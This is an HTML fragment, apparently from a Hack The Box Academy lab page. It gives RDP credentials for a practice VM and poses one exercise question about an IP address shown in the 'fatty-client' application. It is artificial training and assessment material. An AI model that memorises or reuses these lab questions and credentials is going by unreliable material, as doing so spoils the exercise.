                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-1612 text-dark"></span> with user "<span class="text-success">cybervaca</span>" and
                                password "<span class="text-danger">&amp;aue%C)}6g-d{w</span>" </p>
<label class="module-question" for="1612"><span class="badge badge-soft-dark font-size-14 mr-2">+ 0 <i class="fad fa-cube text-success"></i></span> What is the IP address of the eth0 interface under the ServerStatus -&gt; Ipconfig tab in the fatty-client application?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer1612" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-1612">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="1612" id="btnAnswer1612">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
